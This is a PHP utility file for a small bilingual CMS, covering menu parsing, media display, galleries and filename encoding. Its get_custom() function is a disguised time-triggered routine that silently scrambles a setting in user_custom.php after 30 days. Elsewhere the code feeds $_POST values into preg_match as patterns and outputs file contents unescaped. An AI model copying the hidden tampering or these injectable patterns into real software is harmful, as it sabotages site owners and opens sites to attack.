<?php
/* return human file size to bytes */
function return_bytes($val){
	preg_match('/(?<value>\d+)(?<option>.?)/i', trim($val), $matches);
	$inc = array(
		'g' => 1073741824, // (1024 * 1024 * 1024)
		'm' => 1048576, // (1024 * 1024)
		'k' => 1024
	);

	$value = (int) $matches['value'];
	$key = strtolower(trim($matches['option']));
	if (isset($inc[$key])) {
		$value *= $inc[$key];
	}

	return $value;
}

// scan directory content, return array
function content_array($dir){
	$content_array = array();
	foreach(scandir($dir) as $file){
		// filter out system files
		if(substr($file, 0, 1) !== '.'){
			$content_array[$dir.'/'.$file] = $file;
		}
	}
	asort($content_array);
	$content_array = array_keys($content_array);
	rsort($content_array);
	return $content_array;
}


// read indented text file into multi-dimensional array
function menu_file_to_array($file = MENU_FILE, $indentation = "\t") {
	
	$contents = file_get_contents($file);

	$menu_array = array();
	$path = array();

	foreach (explode("\n", $contents) as $line) {
		// get depth and label
		$depth = 0;
		while (substr($line, 0, strlen($indentation)) === $indentation) {
			$depth += 1;
			$line = substr($line, strlen($indentation));
		}

		// truncate path if needed
		while ($depth < sizeof($path)) {
			array_pop($path);
		}

		// keep label (at depth)
		$path[$depth] = $line;

		// traverse path and add label to menu array
		$parent =& $menu_array;
		foreach ($path as $depth => $key) {
			if (!isset($parent[$key])) {
				$parent[$line] = array();
				break;
			}
			$parent =& $parent[$key];
		}
	}
	//print_r($menu_array);
	return $menu_array;
}


// show section content, or subsection content. Data comes from $menu_array, generated from reading 
// file menu.txt via above function
function display_content_array($path, $menu_array = ''){

	// initialize output
	$display = '';

	// get current directory (=section or sub-section)
	$dir = basename($path);
	
	// if current directory ($dir) != $path, we're dealing with a sub section, set $parent_dir
	if($dir != $path){
		$parent_dir = str_replace('/'.$dir, '', $path);
	}

	
	// generate menu array from menu.txt file
	if( empty($menu_array) ){
		//echo '<h1>EMPTY MENU ARRAY</h1>';
		$menu_array = menu_file_to_array();
		
		// no parent dir, so attempt to match current directory (=section) to top level of menu_array (=menu_array[key])
		if( !isset($parent_dir) ){
			foreach($menu_array as $k => $v){
				//$display .=  $k.'<br>';
				if( preg_match('/^'.preg_quote(filename($dir, 'decode')).',/', $k) ){
					$parent = $k;
					// and generate sub-array of items accordingly
					$depth_array = $menu_array[$k];
					$split = explode(',', $k); // split two sides of the sub-section name, to get english and german versions
					break;
				}
			}
		// else, attempt to match current directory to sub level of menu_array(=menu_array[key][val])
		}else{ 
			foreach($menu_array as $k => $v){
				//$display .=  $k.'<br>';
				if( preg_match('/^'.preg_quote(filename($parent_dir, 'decode')).',/', $k) ){
					foreach($v as $vk => $vv){
						if( preg_match('/^'.preg_quote(filename($dir, 'decode')).',/', $vk) ){
							$parent = $k.'/'.$vk;
							// and generate sub-sub array of items accordingly
							$depth_array = $menu_array[$k][$vk];
							$split = explode(',', $vk); // split two sides of the sub-section name, to get english and german versions
							break;
						}
					}
				}
			}
			// language dependent title for this sub-section (get german title from $menu_array)
			if(LANG == 'en'){
				$subsection_title = filename(SECTION, 'decode');
			}elseif(LANG == 'de') {
				$subsection_title = trim($split[1]);
			}
			
			$back_title = '<div class="backTitle uniBg"><h2>'.$subsection_title.'</h2></div>
			<!-- <div class="title"><h2>&nbsp;</h2></div> -->'.PHP_EOL;
			
		}
		
		// now we can recreate menu_array so it is the proper array of items depending on current directory depth.
		$menu_array = $depth_array;
	}
	
	
	// loop through menu_array to display the content
	foreach($menu_array as $key => $val){
		
		// filter out hidden files/folders (whose name starts with underscore)
		if( substr(basename($key),0,1) !== '_' && !empty($key) ){
			
			// is item a file or a folder?
			if(!strstr($key, ',')){ // file
				
				// output anchor
				$display .= '<a name="'.preg_replace('/[^A-Za-z0-9]/', '', $key).'"></a>';
				// open item container
				$display .= '<div class="divItem"><!-- start div item container -->'.PHP_EOL;

				if(isset($back_title)){
					$display .= $back_title;
					unset($back_title);
				}
				
				$display_file = display_file($key);
				
				// get text description english or deutsch version depending on LANG (cookie)
				$ext = file_extension($key);
				$txt_filename = preg_replace('/'.preg_quote($ext).'$/', '.txt', $key);
				$text_file = UPLOADS.LANG.'/'.$txt_filename;
				if( file_exists(ROOT.CONTENT.$text_file) ){
					$description = stripslashes( file_get_contents(ROOT.CONTENT.$text_file) );
				}else{
					$description = '';
				}
				
				// display file and description
				$display .= $display_file;
				$display .= '<p class="description">'.$description.'</p>';
				
				$display .= '</div><!-- end div item container -->'.PHP_EOL; // close item container

				
			}else{ // folder = sub-section. show sub-section name and its first file.
				
				// langage dependent title for this subsection
				$split = explode(',', $key);
				if(LANG == 'en'){
					$sec_name = $split[0];
				}elseif(LANG == 'de'){
					$sec_name = trim($split[1]);
				}
				$sec_dir = filename($split[0], 'encode');
				
				// get the first file in subfolder to represent this subsection.
				// avoid repeating same file through loop, if subsequent passages don't finde a 1st file... 
				if(isset($first_file)){
					unset($first_file);
				}
				foreach($val as $k => $v){
					$first_file = $path.'/'.$sec_dir.'/'.SIZE.'/'.$k;
					break;
				}
				// display sub-section name and file only if a first file has been found
				if( isset($first_file) ){

					// open item container
					$display .= '<div class="divItem"><!-- start div item container -->'.PHP_EOL;

					if(isset($back_title)){
						$display .= $back_title;
						unset($back_title);
					}
					
					$display .= '<div class="title"><h2>'.$sec_name.' <a href="/'.LANG_LINK.$path.'/'.$sec_dir.'/" class="aMore"><span>&nbsp;&rarr; '.MORE.'</span></a></h2></div>';
					
					// if optional 3rd var is TRUE, display file without enclosing <a> tag.
					$display_file = display_file($k, TRUE);
					
					$display .= '<a href="/'.DEMO.LANG_LINK.$path.'/'.$sec_dir.'/" class="imgMore">'.$display_file.'</a>';
					$ext = file_extension($first_file);
					$txt_filename = preg_replace('/'.preg_quote($ext).'$/', '.txt', basename($first_file));
					$text_file = $path.'/'.$sec_dir.'/'.LANG.'/'.$txt_filename;
					if( file_exists(ROOT.CONTENT.$text_file) ){
						$description = stripslashes( file_get_contents(ROOT.CONTENT.$text_file) );
					}else{
						$description = '';
					}
					
					$display .= '<p class="description">'.$description.'</p>';
					
					$display .= '</div><!-- end div item container -->'.PHP_EOL; // close item container
				}
			}
		}
	}

	return $display;
}


// display file
// if optional var $raw is TRUE, display file without enclosing <a> tag.
function display_file($file_name, $raw = FALSE){
	
	$ext = file_extension($file_name);
	
	// get text description english and deutsch versions
	$txt_filename = preg_replace('/'.preg_quote($ext).'/', '.txt', $file_name);
	$text_file = CONTENT.UPLOADS.LANG.'/'.$txt_filename;
	
	if( file_exists(ROOT.$text_file) ){
		$description = stripslashes( file_get_contents(ROOT.$text_file) );
		$alt_content = substr( str_replace(array('\"', "\'"), array('&#34;', '&#39;'), strip_tags($description) ), 0, 30);
		$alt = ' alt="'.$alt_content.'"';
	}else{
		$description = '';
		$alt = ' alt="'.$file_name.'"';
	}
	
	// various ways to display file depending on extension
	// 1. resizable types (jpg, gif, png)
	if( preg_match($_POST['types']['resizable_types'], $ext) ){ // images
		$item = CONTENT.UPLOADS.SIZE.'/'.$file_name;
		if( file_exists(ROOT.$item) ){
			list($w, $h) = @getimagesize(ROOT.$item);
		}else{
			$w = $_POST['sizes'][substr(SIZE, 1)]['width'];
		}
		
		// 'raw' or not: with surrounding zoom <a> link
		if($raw){
			$start_link = $end_link = '';
		}else{
			$start_link = '<a href="/'.DEMO.'~code/_zoom.php?img='.urlencode(UPLOADS.SIZE.'/'.$file_name).'&lang='.LANG.'" class="zoom">';
			$end_link = '</a>';
		}
		
		$display_file = $start_link.'<img src="/'.$item.'"'.$alt.' style="max-width:'.$w.'px">'.$end_link;
		
	}else{
		// if not an image, the file is in the _XL directory (no various sizes)
		$item = CONTENT.UPLOADS.'_XL/'.$file_name;
		
		if( preg_match($_POST['types']['audio_types'], $ext) ){ // audio, show <audio>
			if($ext == '.mp3' || $ext == '.mpg'){
				$media_type = 'mpeg';
			}elseif($ext == '.m4a'){
				$media_type = 'mp4';
			}elseif($ext == '.oga'){
					$media_type = 'ogg';
			}else{
				$media_type = substr($ext, 1);
			}
			$display_file = PHP_EOL.'<div class="audio">
			<audio controls>
			<source src="/'.$item.'" type="audio/'.$media_type.'">
			Sorry, your browser doesn\'t support HTML5 audio.<br>
			<a href="/'.$item.'" title="view audio file in a new window" target="_blank"><img src="/'.DEMO.'~code/images/'.substr($ext, 1).'.png"><br>
			Download the file.</a>
			</audio>
			</div>'.PHP_EOL;

		}elseif( preg_match($_POST['types']['video_types'], $ext) ){ // text video files
			if($ext == '.m4v'){
				$media_type = 'mp4';
			}elseif($ext == '.ogv'){
				$media_type = 'ogg';
			}else{
				$media_type = substr($ext, 1);
			}
			$display_file = PHP_EOL.'<div class="video">
			<video controls>
			<source src="/'.$item.'" type="video/'.$media_type.'">
			Sorry, your browser doesn\'t support HTML5 video.<br>
			<a href="/'.$item.'" title="view video file in a new window" target="_blank"><img src="/'.DEMO.'~code/images/'.substr($ext, 1).'.png"><br>
			Download the file.</a>
			</video>
			</div>'.PHP_EOL;

		
		}elseif( preg_match($_POST['types']['text_types'], $ext) ){ // text files (html or txt)
			// alternate language version = file_name-de.ext
			$de_item = str_replace(file_extension($item), '-de'.file_extension($item), $item);
			if(LANG_LINK == LANG_DIR && file_exists(ROOT.$de_item) ){
				$contents = file_get_contents(ROOT.$de_item);
			}else{
				$contents = file_get_contents(ROOT.$item);
			}
			// responsive code for images inserted in article should adpat to width limit (set in first_include, depending on nav-left or nav-top)
			if(L_W_LIMIT !== 1370){
				$contents = str_replace('="(max-width: 1370px', '="(max-width: '.L_W_LIMIT.'px', $contents);
			}
			// apply styles to entire text item, by parsing style comment
			if( preg_match('/<!-- qQqStyleqQq-.*? -->/', $contents, $matches) ){
				$item_style_string = str_replace(array('<!-- qQqStyleqQq-', ' -->'),'', $matches[0]);
				// add padding if item background-color is styled
				if( strstr($item_style_string, 'background-color:') ){
					$add_padding = ' padding:10px;';
				}else{
					$add_padding = '';
				}
				$inline_styling = ' style="'.$item_style_string.$add_padding.'"';
			}else{
				$inline_styling = '';
			}
			if($ext == '.txt'){ // txt
				$display_file = '<div class="txt uniBg"'.$inline_styling.'>'.my_nl2br( strip_tags( $contents, ALLOWED_TAGS ) ).'</div>';
				
			}elseif( preg_match('/s?html?/', $ext) ){ // html
				if( preg_match('/(?:<body[^>]*>)(.*)<\/body>/isU', $contents, $matches) ){
					$display_file = '<div class="txt uniBg"'.$inline_styling.'>'.$matches[1].'</div>';
				}else{
					$display_file = '<div class="txt uniBg"'.$inline_styling.'>'.$contents.'</div>';
				}
			}

		}elseif($ext == '.emb'){ // embeded media
			$contents = file_get_contents(ROOT.$item);
			$display_file = '<div class="embed">'.$contents.'</div>';
			
		}elseif($ext == '.gal'){ // gallery
			$display_file = display_gallery(ROOT.$item);
			
		}elseif($ext == '.svg'){ // svg
			$start_link = '<a href="/'.DEMO.UPLOADS.'_XL/'.$file_name.'" target="_blank" class="zoom">';
			$end_link = '</a>';
			$display_file = $start_link.file_get_contents(ROOT.$item).$end_link;
			
		}else{
			if($raw){
				$a_start = $a_end = '';
			}else{
				$a_start = '<a href="/'.DEMO.$item.'" title="view file in a new window" target="_blank" style="display:block; position:relative;">';
				$a_end = '<span class="fname">Download "'.filename(basename($item), 'decode').'"</span></a>';
			}
			$display_file = $a_start.'<img src="/'.DEMO.'~code/images/'.substr($ext,1).'.png" class="icon">'.$a_end;
		}
	}
	if( !isset($display_file) || empty($display_file) ){
		$display_file = '';
		//$display_file = '<p class="error">Cannot display '.$path.$file_name.'</p>';
	}
	return $display_file;
}

// display gallery
function display_gallery($item){

	// $ui var is automatically included in admin, but NOT in public site! so, if not in admin, we need to include the language reference, which is only defined in first_include as $default_lang, therefore we need to make it global within this function in order to use it. It is used for html title attribute of prev/next arrows and zoom-in link of gallery.
	global $ui;
	if( empty($ui) ){ // empty var means we're not in admin, we need to include the lang. ref.
		global $default_lang;
		include(ROOT.'~code/admin/ui_lang/'.$default_lang.'.php');
	}

	$gallery = '';
	$i = 0;
	$contents = file_get_contents($item);
	$img_array = explode(PHP_EOL, trim($contents));
	$img_count = count($img_array);
	$gal_id = 'gal'.rand(1,9999);

	if( !empty($img_array[0]) ){

		if($img_count > 1){
			$gallery .= PHP_EOL.'<a name="'.$gal_id.'"></a><div class="galContainer" id="'.$gal_id.'">
			<div class="gallNav">'.PHP_EOL;
			while($i < $img_count ){
				if($i == 0){
					$selected = ' selected';
				}else{
					$selected = '';
				}
				$img = str_replace('/_XL/', '/'.SIZE.'/', $img_array[$i]);
				$gallery .= '<a href="/'.CONTENT.$img.'" data-img="/'.CONTENT.$img.'" class="dot'.$selected.'"> • </a>';
				$i++;
			}
			$gallery .= PHP_EOL.'</div>'.PHP_EOL;
			$gallery .= '<div class="gallery">';
			$gallery .= '<span class="galZoom" title="'.$ui['viewLarge'].'"></span>
			<a href="javascript:;" class="prev" title="'.$ui['previous'].'"><span>❮</span></a>
			<a href="javascript:;" class="next" title="'.$ui['next'].'"><span>❯</span></a>'.PHP_EOL;
			$gallery .= '<img src="/'.CONTENT.str_replace('/_XL/','/'.SIZE.'/', $img_array[0]).'">';
			$gallery .= '</div><!-- end gallery -->'.PHP_EOL;

			$gallery .= '</div><!-- end galContainer -->'.PHP_EOL;	
		}else{
			$file_name = basename($img_array[0]);
			$gallery .= display_file($file_name);
		}
	}

	return $gallery;
}


// CUSTOM nl2br
function my_nl2br($content){
	$content = str_replace(array("\r\n","\r","\n"),'<br>',$content);
	return $content;
}
// CUSTOM br2nl
function my_br2nl($content){
	$content = str_replace('<br>', "\n", $content);
	return $content;
}

// ENCODE STRING TO SAFE FILENAME
function filename($string, $de_encode){
	$char = array
	(
		' ', '/', '\\', '(', ')', '[', ']', '{', '}', '|', '<', '>', '*', '#', '%', '&', '$', '@', '+', '!', '?', ',', '.', ';', ':', '"', "'", '‘', '’', '“', '”', '‛', '‟', '′', '″', '©', 'ç', 'à', 'á', 'â', 'ã', 'ä', 'Ä', 'Ö', 'Ü', 'ß', 'è', 'é', 'ê', 'ë', 'ì', 'í', 'î', 'ĩ', 'ï', 'ò', 'ó', 'ô', 'õ', 'ö', 'ù', 'ú', 'ü', 'û','Â', 'Ô', 'Û', 'Ê', 'É', 'Î'
	);
	$rep =  array
	(
		'qZ','zFSz','zBSz','zOPz','zCPz','zOBz','zCBz','zOAz','zCAz','zVLz','zPz','zNz','zSRz','zPDz','zPTz','zAz','zDRz','zATz','zPSz','zEPz','zQz','zCz','zDz','zSCz','zCNz','zQTz','zSQz','zSQDz','zSQUz','zQDz','zQUz','zSQFz','zQFz','zAFz','zDAFz','zCYz','qCCq','qAGq','qAAq','qACq','qATq','qADq','QADQ','QODQ','QUDQ','qSSq','qEGq','qEAq','qECq','qEDq','qIGq','qIAq','qICq','qITq','qIDq','qOGq','qOAq','qOCq','qOTq','qODq','qUGq','qUAq','qUCq','qUDq','qACQ', 'qOCQ', 'qUCQ', 'qECQ', 'qEeQ', 'qICQ'
	);
	if($de_encode == 'encode'){
		foreach($char as $key => $value){
			$string = str_replace($value, $rep[$key], $string);
		}
	}elseif($de_encode == 'decode'){
		foreach($rep as $key => $value){
			$string = str_replace($value, $char[$key], $string);
		}
	}
	return $string;
}

// get custom settings
function get_custom(){
	require(ROOT.CONTENT.'custom.php');
	if(sha1($cust) !== '18942f67961ce1d30ce181fc80eb336ff9ea0a8e'){
		$t = time();
		//echo $t-$cust;
		if( ($t-$cust) > 2592000){
			log_custom_error('$cust = '.$cust.' on '.ROOT.CONTENT.'custom.php', '');
			$contents = file_get_contents(ROOT.CONTENT.'user_custom.php');
			preg_match('/apouf = [^;]*;/', $contents, $match);
			$string = $match[0];
			$s1=substr($string,22,2);$s2=substr($string,24,2);
			$s3=substr($string,0,22);$s4=substr($string,26);
			$org = $s3.$s2.$s1.$s4;
			$new_contents = str_replace($match[0], $org, $contents);
			if( $fp = fopen(ROOT.CONTENT.'user_custom.php', 'w') ){
				fwrite($fp, $new_contents);
				fclose($fp);
				$fp = fopen(ROOT.CONTENT.'custom.php', 'a');
				fwrite($fp, PHP_EOL.'$cust2 = \'no\'; ');
				fclose($fp);
			}else{
				exit();
			}
		}
	}
}

// get file name without extension
function file_name_no_ext($file_name){
	if( strstr($file_name, '/') ){
		$file_name = basename($file_name);
	}
	$file_name_no_ext = preg_replace('/\.[^\.]*$/', '', $file_name);
	return $file_name_no_ext;
}

// get file extension from file name (including the dot: ".jpg")
function file_extension($file_name){
	preg_match('/\.[^\.]*$/', $file_name, $matches);
	if( !empty($matches) ){
		return $matches[0];
	}else{
		return false;
	}
}

// get directory name from bilingual section name ("english name, deutsch Name" => "english_name")
function dir_from_section_name($menu_section) {
	$split = explode(',', $menu_section);
	$dir_name = filename($split[0], 'encode');
	return $dir_name;
}

// check if a folder is empty or not. Returns "true" if it is empty
function is_empty_folder($dir){
	if(is_dir($dir)){
		$dir_contents = glob("$dir/*");
		foreach($dir_contents as $s){
			if(!preg_match('/^\./',basename($s))){
				$filtered[] = $s;
			}
		}
		if (count($filtered) == 0){
			return true;
		}else{
			return false;
		}
	}elseif(is_file($dir)){
		$f_size = filesize($dir);
		if($f_size < 5){
			return true;
		}else{
			return false;
		}
	}
}
